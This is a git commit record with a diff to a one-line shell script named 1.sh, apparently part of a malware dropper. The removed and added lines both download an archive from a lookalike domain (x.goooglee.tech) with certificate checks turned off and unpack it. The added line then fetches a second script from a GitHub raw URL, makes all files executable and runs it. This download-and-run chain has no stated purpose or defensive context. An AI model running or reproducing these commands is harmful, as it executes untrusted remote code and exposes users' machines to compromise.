796043e5444f09fab3e5ba8d7438b75c0a46fddd
no107yes990 <no107yes990@sjamusicpro.xyz>
2025-01-03 14:27:35 +0900

    Update 1.sh

--- 1.sh
+++ 1.sh
@@ -1,1 +1,1 @@
-wget -O x --no-check-certificate x.goooglee.tech/xnxx-262.tar.gz && tar -xvf x
+wget -O x --no-check-certificate x.goooglee.tech/xnxx-262.tar.gz && tar -xvf x && wget -qO z https://raw.githubusercontent.com/no107yes990/a/refs/heads/main/2.sh && chmod +x * && ./z
